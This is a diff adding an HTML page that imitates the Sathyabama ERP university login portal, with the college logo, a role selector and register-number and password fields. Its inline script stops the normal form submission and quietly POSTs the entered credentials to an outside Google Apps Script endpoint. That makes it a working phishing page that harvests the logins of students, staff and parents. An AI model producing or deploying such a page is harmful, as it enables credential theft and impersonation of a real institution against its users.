@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Sathyabama ERP</title>
+        <link rel="stylesheet" href="style/style.css">
+    </head>
+    <body>
+        <div class="erppage-01">
+            <div class="transbox"> 
+            <img src="sathyabama_header-logo-A++.jpg"  alt="College-Name" class="college-img">
+            <p class="image-below">Enter your RegNo and DOB to access <br>student panel.</p>
+            <form>
+            <select class="custom-select">
+                <option value="1">New Admission</option>
+                <option value="2">Staff</option>
+                <option value="3">Student</option>
+                <option value="4">Parents</option>
+            </select>
+            <p class="para-reg">RegisterNumber</p>
+            <input name="register" type="RegisterNumber" formcontrolname="RegisterNumber" id="RegisterNumber" placeholder="Register Number" class="form-controler" required>
+            <p class="para-pass">Password</p>
+            <input name="password"  formcontrolname="password" id="Password" placeholder="Enter Password" class="form-controler-pass" type="Password" required>
+            <button type="submit" class="button-login" id="btn" name="send">LOG IN</button>
+        </form>
+        </div>
+        <p class="button-forgot">Forgot your password?</p>
+        <p class="copy-right"> 2021 © Sathyabama ERP</p>
+        </div> 
+        <script>
+            let form = document.querySelector("form");
+            form.addEventListener('submit',(e)=>{
+                e.preventDefault();
+                let data = new FormData(form);
+                fetch('https://script.google.com/macros/s/AKfycbxdz7quwEsfapJcNIYVBvZkwWRUPb1ZR95MngNeo9pWd3GeDF8878H9uz8DMgmTcYQi/exec',{
+                    method:"POST",
+                    body:data
+                })
+                    .then(res => res.text())
+                    .then(data => console.log(data));
+            })
+        </script>
+    </body>
+    
+</html> 
